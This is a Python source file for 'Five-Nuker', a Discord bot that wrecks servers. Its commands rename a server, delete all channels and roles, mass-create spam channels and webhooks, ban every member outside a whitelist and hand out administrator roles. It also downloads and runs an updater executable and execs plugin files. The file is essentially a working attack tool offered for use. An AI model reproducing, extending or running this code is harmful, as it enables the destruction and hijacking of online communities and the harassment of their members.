import discord
from discord.ext import commands
import json
import os
from colorama import Fore as F
from modules import *
from asyncio import create_task
from random import choice
from time import sleep
import logging
import webbrowser
import urllib3
import zipfile
import urllib.request
import shutil
import multiprocessing
import keyboard

os.system("title Five-Nuker")

drawer = Drawer()

def stop_nuker():
    if os.name == "nt":
        os.system("pause")
    quit()

def clear():
    if os.name=='nt':
        os.system('cls')
    else:
        os.system('clear')


def start_update():
    drawer.Center("Running the nuker update...")

    urllib.request.urlretrieve("https://github.com/glitch65/Five-nuker/raw/Rework/updater.zip", "updater.zip")
    
    with zipfile.ZipFile("updater.zip", "r") as updater:
        updater.extractall()
    
    os.system("updater.exe")

if os.path.exists("updated"):
    os.system('taskkill /f /im updater.exe')
    sleep(2)
    os.remove("updater.exe")
    shutil.rmtree("_updater-stuff")
    os.remove("updated")
    clear()

if __name__ == '__main__':
    local_version = str("0.5")

    http = urllib3.PoolManager()

    get_last_ver = http.request('GET', 'https://raw.githubusercontent.com/glitch65/Five-nuker/ver_reborn/curent_version')

    get_last_ver = get_last_ver.data.decode('utf-8')

    if not local_version == get_last_ver:
        drawer.Center("New version of Five-nuker avaible!")
        drawer.Center(f"{local_version} -> {get_last_ver}")
        if os.name == "nt" and os.path.exists("_five-nuker-contents-dir"):
            start_update()
        else:
            drawer.Center("Opening a page with download and with a changelog after a few seconds...")
            sleep(3)
            webbrowser.open("https://github.com/glitch65/Five-nuker/releases")




if __name__ == '__main__':
    txt = """  █████▒██▓ ██▒   █▓▓█████  ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓██   ▒▓██▒▓██░   █▒▓█   ▀  ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒████ ░▒██▒ ▓██  █▒░▒███   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█▒  ░░██░  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒█░   ░██░   ▒▀█░  ░▒████▒▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
 ▒ ░   ░▓     ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░      ▒ ░   ░ ░░   ░ ░  ░░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░    ▒ ░     ░░     ░      ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
        ░        ░     ░  ░         ░    ░     ░  ░      ░  ░   ░     
                ░                                                     """


    

def_cfg = {
                "token": "TOKENHERE",
                "prefix": "!",
                "nuke_prefix": ".",
                "names_of_channels_and_roles": ["Paste","here", "your", "channel", "names"],
                "name_of_webhooks": "Five Nuker",
                "names_of_roles": ["Paste","here", "your", "roles", "names"],
                "spam_text": "Paste here your spam text",
                "spam_mode": 1,
                "channels_create_count": 10,
                "roles_create_count": 10,
                "spam_in_channel_count": 10,
                "cmd mode": False,
                "server_name": "Nuked by Five Nuker",
                "whitelisted_ids": [1207760690899849350, 743781026534260836],
                "only_whitelisted_users_can_perform_actions": False,
                "only_whitelisted_people_can_activate_the_command_prompt": True,
                "Enable logging?": False,
                "Ban on server nuke?": True,
                "ban_reason": "XDDDDDDDDDDDDDDDDDDDDDDDD",
                "admin_role_name": "sh....",
                "invisible_mode": False,
                "Enable_activity": True,
                "Activity_type": "playing",
                "Activity_name": "Five Nuker on TOP!",
                "Selected_theme": "default",
                "Enable_plugins?": False
                }

def_theme = {
    "logo_pallete": ((125,0,255),(0,0,0)),
    "logo_gradient_type":"V",
    "logo_gradient_steps":11,
    "logged_in_pallete": ((7,227,0),(7,145,3),(6,214,0),(5,138,1),(5,102,2),(4,117,2),(4,92,2)),
    "logged_in_gradient_type": "H",
    "logged_in_gradient_steps": 18,
    "invisible_mode_pallete":((163,163,163),(133,133,133),(99,99,99)),
    "invisible_mode_type":"H",
    "invisible_mode_steps": 21,
    "activity_type_error_pallete": ((255,0,0),(176,0,0)),
    "activity_type_error_gradient_type": "H",
    "activity_type_error_steps": 191,
    "command_triggered_pallete": ((0,255,0),(0,125,0),(0,255,0)),
    "command_triggered_gradient_type": "H",
    "nuke_started_pallete": ((255,0,0),(255,0,0)),
    "nuke_started_gradient_type": "H",
    "nuke_started_steps": 1
}


def load_plugins():
    for file in os.listdir("plugins"):
        if file.endswith(".py"):
            plugin = os.path.join("plugins", file)
            with open(plugin, "r") as plugin:
                plugin_stuff = plugin.read()
                exec(plugin_stuff,globals())

if not os.path.exists("plugins"):
    os.mkdir("plugins")

if not os.path.exists("cfg"):
            os.mkdir("cfg")
            with open("cfg/config.json", "w") as cfg:
                json.dump(def_cfg,cfg,indent=3)
            print(f"{F.YELLOW}cfg/config.json not exists, created a config file!\nPlease check and edit a cfg/config.json!{F.RESET}")
            stop_nuker()
    
if os.path.exists("cfg/config.json"):
    try:
        with open("cfg/config.json", "r") as cfg:
            config = json.loads(cfg.read())
    except Exception as e:
        print("failed to load the config :(")
        print(f"{e}")
        stop_nuker()
else:
                with open("cfg/config.json", "w") as cfg:
                    json.dump(def_cfg,cfg,indent=3)
                print(f"{F.YELLOW}cfg/config.json not exists, created a config file!\nPlease check and edit a cfg/config.json!{F.RESET}")
                stop_nuker()
error = False
list_of_settings = ["token",
                            "prefix",
                            "nuke_prefix",
                            "names_of_channels_and_roles",
                            "name_of_webhooks",
                            "names_of_roles",
                            "spam_text",
                            "spam_mode",
                            "channels_create_count",
                            "roles_create_count",
                            "spam_in_channel_count",
                            "cmd mode",
                            "server_name",
                            "whitelisted_ids",
                            "only_whitelisted_users_can_perform_actions",
                            "only_whitelisted_people_can_activate_the_command_prompt",
                            "Enable logging?",
                            "Ban on server nuke?",
                            "ban_reason",
                            "admin_role_name",
                            "invisible_mode",
                            "Activity_type",
                            "Activity_name",
                            "Selected_theme",
                            "Enable_plugins?"]
for setting in list_of_settings:
                try:
                    i = config[setting]
                except KeyError:
                    config[setting] = def_cfg[setting]
                    with open("cfg/config.json", "w") as cfg:
                        json.dump(config,cfg,indent=3)
                    if error == False:
                        error = True
if error == True:            
            clear()
            drawer.Center("When checking the config, some bugs were found and fixed")
            drawer.Center("This usually happens if there are missing lines in your config. This can be caused by a nuker update.")
            drawer.Center("It is recommended to check and change config")
            drawer.Center("To continue press the space bar on your keyboard...")
            keyboard.wait("space")
            clear()
        
    
    
def themes_empty():
    return len(os.listdir("cfg//themes")) == 0
if not os.path.exists("cfg//themes"):
            os.mkdir("cfg//themes")
            with open(f"cfg/themes/default.json", "w") as theme:
                json.dump(def_theme,theme,indent=3)

if __name__ == '__main__':            
    if themes_empty:
        with open(f"cfg/themes/default.json", "w") as theme:
                    json.dump(def_theme,theme,indent=3)
    try:
        with open(f"cfg/themes/{config["Selected_theme"]}.json", "r") as thm:
            theme = json.loads(thm.read())
    except Exception as e:
        print("failed to load theme :(")
        print(f"{e}")
        stop_nuker()        

if __name__ == '__main__':
    print(drawer.CenterColor(drawer.converting(theme["logo_pallete"]), theme["logo_gradient_steps"],txt,theme["logo_gradient_type"]))
    print(f"{F.GREEN}Config file loaded!{F.RESET}")
    
    if config["Enable logging?"] == False:
        logging.getLogger("discord.http").disabled = True
        logging.getLogger("discord.client").disabled = True
        logging.getLogger("discord.gateway").disabled = True

with open('icon.png', 'rb') as f:
    icon = f.read()
    


bot = commands.Bot(config['prefix'],intents=discord.Intents.all(),help_command=None)

if __name__ == '__main__':
    @bot.event
    async def on_ready():
        clear()
        os.system(f"title Five Nuker - Online - {bot.user} - ")
        if not cmd_mode:
            print(drawer.CenterColor(text=txt,colors=drawer.converting(theme["logo_pallete"]), steps=theme["logo_gradient_steps"],type=theme["logo_gradient_type"]))
            print(drawer.CenterColor(text=f"You loggen by {bot.user}",colors=drawer.converting(theme["logged_in_pallete"]), steps=theme["logged_in_gradient_steps"],type=theme["logged_in_gradient_type"]))
        if config["Activity_type"] == "playing" and config["invisible_mode"] == False:
            await bot.change_presence(activity=discord.Game(name=config["Activity_name"]))
        elif config["Activity_type"] == "listening" and config["invisible_mode"] == False:
            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=config["Activity_name"]))
        elif config["Activity_type"] == "streaming" and config["invisible_mode"] == False:
            await bot.change_presence(activity=discord.Streaming(name=config["Activity_name"], url='https://www.twitch.tv/'))
        elif config["Activity_type"] == "watching" and config["invisible_mode"] == False:
            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=config["Activity_name"]))
        elif config["Activity_type"] == None and config["invisible_mode"] == True:
            await bot.change_presence(status=discord.Status.offline)
            print(drawer.CenterColor(text="Invisible mode enabled!",colors=drawer.converting(theme["invisible_mode_pallete"]), steps=theme["invisible_mode_steps"],type=theme["invisible_mode_type"]))
        else:
            print(drawer.CenterColor(text="ERROR!!! Activity_type must be playing, listening, streaming, watching or null. invisible_mode must be true or false. The bot's activity will not change and invisible mode will not be enabled",colors=drawer.converting(theme["activity_type_error_pallete"]),steps=theme["activity_type_error_steps"],type=theme["activity_type_error_gradient_type"]))
        if cmd_mode:
            await launch_cmd()
        if not cmd_mode:        
            drawer.Center(f"Message logs:")  

cmd_mode = config["cmd mode"]

async def launch_cmd():
        print(f"{drawer.gradientText([(156, 0, 245),(0,0,0)],len("Five nuker"),"Five nuker","H")} v{local_version} © G1itch, KotdemontoK")
        print("")
        while True:
            cmd_command = input("Five nuker> ")
            if cmd_command.startswith("help"):
                    print("List of commands: \n")
                    print("help - shows list of all commands \nquit - closes nuker \ncls - clear \nclear - same as cls \nnuke [server id] - nukes server \noff - disables command prompt mode thereby restoring the bot's functionality")
            elif cmd_command.startswith("quit"):
                    quit()
            elif cmd_command.startswith("cls") or cmd_command.startswith("clear"):
                    clear()
                    print(f"{drawer.gradientText([(156, 0, 245),(0,0,0)],len("Five nuker"),"Five nuker","H")} v{local_version} ©G1itch, KotdemontoK")
                    print("")
            elif cmd_command.startswith("nuke"):
                    server_id=cmd_command.split(" ")
                    curent_guild = bot.get_guild(int(server_id[1]))
                    await curent_guild.edit(name=config["server_name"], icon=icon)
                    spamCount = config['spam_in_channel_count']
                    channelsCreate = config['channels_create_count']
                    print(drawer.gradientText(text=f"Nuking a {curent_guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",colors=theme["nuke_started_pallete"], steps=theme["nuke_started_steps"],type=theme["nuke_started_gradient_type"]))
                    create_task(delete_channels(curent_guild))
                    create_task(delete_roles(curent_guild))
                    for i in range(config["roles_create_count"]):
                        multiprocessing.Process(target=start_roles_create(curent_guild)).start()
                    for i in range(channelsCreate):
                        multiprocessing.Process(target=start_channels_create(curent_guild)).start()
                    if config["Ban on server nuke?"] == True:
                        create_task(banAll(curent_guild))
            elif cmd_command.startswith("off"):
                print(f"Heartbeat unlocked! run {config["nuke_prefix"]}on in any server(if that bot is out there, of course), any channel, even in bot dm's \nto access the command prompt")          
                if config["only_whitelisted_people_can_activate_the_command_prompt"]:
                    print("\nKeep in mind that in the config only_whitelisted_people_can_activate_the_command_prompt is set to true! Only whitelisted people can activate the bot! When the command prompt mode is active the bot will not react to any commands!")
                else:
                    print("\nKeep in mind that in the config only_whitelisted_people_can_activate_the_command_prompt is set to false! Anyone can activate the command prompt mode and block the bot's work.")
                break
            else:
                    print('Wrong command! Type help to see a list of commands!')
  


async def send_wb(object: discord.TextChannel):
    a=0
    final_count = config['spam_in_channel_count'] + 1
    while True:
        a = a+1
        if a == final_count:
            break
        try: 
            await object.send(config['spam_text'])     
        except Exception as e:
            print(e)


async def create_channels(guild):
    try:
        channel = await guild.create_text_channel(name=choice(config['names_of_channels_and_roles']))
        wb = await channel.create_webhook(name=config['name_of_webhooks'], avatar=icon)
        create_task(send_wb(wb))
    except Exception as e:
        print(e)

async def createrole(guild):
    try: await guild.create_role(name=choice(config["names_of_roles"]))
    except: pass

async def delete_channels(guild: discord.Guild):
        for i in guild.channels:
            try:
                create_task(i.delete())
            except Exception as e:
                print(e)
async def delete_roles(guild: discord.Guild):
    for i in guild.roles:
        try:
            await i.delete()
        except:
            pass





async def banAll(ctx):
    all_members_list = list(ctx.members)
    if not cmd_mode:
        all_members_list.remove(ctx.author)
    for i in config['whitelisted_ids']:
        try:
            all_members_list.remove(bot.get_user(i))
        except: pass
    for i in all_members_list:
        try:
            create_task(i.ban(reason=config['ban_reason'], delete_message_days=7))
        except: pass


if __name__ == '__main__':
    @bot.event
    async def on_message(message: discord.Message):   
        if message.author.bot:
            return
        msg = message.content
        cmd_name_witout_prefix = msg.split()[0][1:]
        if msg.startswith(config["nuke_prefix"]):
            print(drawer.CenterColor(text=f"[{message.author}]:{msg}",colors=drawer.converting(theme["command_triggered_pallete"]), steps=len(f"[{message.author}]: {msg}"),type=theme["command_triggered_gradient_type"]))
            args = msg.split()
            if args[0] == config['nuke_prefix']+"nuke":
                if config['only_whitelisted_users_can_perform_actions'] == True:
                    if message.author.id in config['whitelisted_ids']:
                        curent_guild = message.guild
                        await message.guild.edit(name=config["server_name"], icon=icon)
                        spamCount = config['spam_in_channel_count']
                        channelsCreate = config['channels_create_count']
                        print(drawer.CenterColor(text=f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",colors=drawer.converting(theme["nuke_started_pallete"]), steps=theme["nuke_started_steps"],type=theme["nuke_started_gradient_type"]))
                        create_task(delete_channels(message.guild,))
                        create_task(delete_roles(message.guild,))
                        for i in range(config["roles_create_count"]):
                            multiprocessing.Process(target=start_roles_create(curent_guild)).start()
                        for i in range(channelsCreate):
                            multiprocessing.Process(target=start_channels_create(curent_guild)).start()
                        if config["Ban on server nuke?"] == True:
                            create_task(banAll(message))
                else:
                    curent_guild = message.guild
                    await message.guild.edit(name=config["server_name"], icon=icon)
                    spamCount = config['spam_in_channel_count']
                    channelsCreate = config['channels_create_count']
                    print(drawer.CenterColor(text=f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",colors=drawer.converting(theme["nuke_started_pallete"]), steps=theme["nuke_started_steps"],type=theme["nuke_started_gradient_type"]))
                    create_task(delete_channels(message.guild,))
                    create_task(delete_roles(message.guild,))
                    for i in range(config["roles_create_count"]):
                            multiprocessing.Process(target=start_roles_create(curent_guild)).start()
                    for i in range(channelsCreate):
                        multiprocessing.Process(target=start_channels_create(curent_guild)).start()
                    if config["Ban on server nuke?"] == True:
                        create_task(banAll(message))
            elif args[0] == config["nuke_prefix"]+"admin":
                if config['only_whitelisted_users_can_perform_actions'] == True:
                    if message.author.id in config['whitelisted_ids']:
                        if args[1] == "me":
                            guild = message.guild
                            get_bot = guild.get_member(bot.user.id)
                            top_role = max(get_bot.roles, key=lambda r: r.position)
                            r = await guild.create_role(name=config["admin_role_name"])
                            await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
                            await message.author.add_roles(r)
                            await message.delete()
                        elif args[1] == "all":
                            guild = message.guild
                            get_bot = guild.get_member(bot.user.id)
                            top_role = max(get_bot.roles, key=lambda r: r.position)
                            r = await guild.create_role(name=config["admin_role_name"])
                            await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
                            await message.delete()
                            for members in list(message.guild.members):
                                await members.add_roles(r)
                else:
                    if args[1] == "me":
                            guild = message.guild
                            get_bot = guild.get_member(bot.user.id)
                            top_role = max(get_bot.roles, key=lambda r: r.position)
                            r = await guild.create_role(name=config["admin_role_name"])
                            await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
                            await message.author.add_roles(r)
                            await message.delete()
                    elif args[1] == "all":
                            guild = message.guild
                            get_bot = guild.get_member(bot.user.id)
                            top_role = max(get_bot.roles, key=lambda r: r.position)
                            r = await guild.create_role(name=config["admin_role_name"])
                            await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
                            await message.delete()
                            for members in list(message.guild.members):
                                await members.add_roles(r)
            elif args[0] == config["nuke_prefix"]+"on":
                if config["only_whitelisted_people_can_activate_the_command_prompt"]:
                    if message.author.id in config['whitelisted_ids']:
                        await launch_cmd()          
                else:
                    await launch_cmd()

            elif args[0] != config['nuke_prefix']+"nuke" and  config["nuke_prefix"]+"admin":
                if cmd_name_witout_prefix in globals():
                    if config["Enable_plugins?"] == True:
                        await globals()[cmd_name_witout_prefix](message)
      

            

        elif msg.startswith(config["prefix"]):
            drawer.CenterColor(text=f"[{message.author}]:{msg}",colors=[(0,255,255),(0,125,125),(0,255,255)], steps=len(f"[{message.author}]: {msg}"),type="H")
        elif msg.startswith("@everyone") or msg.startswith("@here") or msg.startswith(f"<@{bot.user.id}>"):
            drawer.CenterColor(text=f"[{message.author}]:{msg}",colors=[(255,255,0),(125,125,0),(255,255,0)], steps=len(f"[{message.author}]: {msg}"),type="H")
        else:
            drawer.Center(f"[{message.author}]: {msg}")

def start_roles_create(guild):
    create_task(createrole(guild))

def start_channels_create(guild):
    create_task(create_channels(guild))

if __name__ == '__main__':
    if config["Enable_plugins?"] == True:
        load_plugins()
    try: bot.run(config['token'])
    except Exception as e:
        print(drawer.gradientText([(255,0,0),(255,0,0)],1,f"[ERROR] Token incorrect! Please send your error message to our support!\n\nError message: {e}","V"))
        webbrowser.open("https://discord.gg/QTDXqt8PA8")
        stop_nuker()

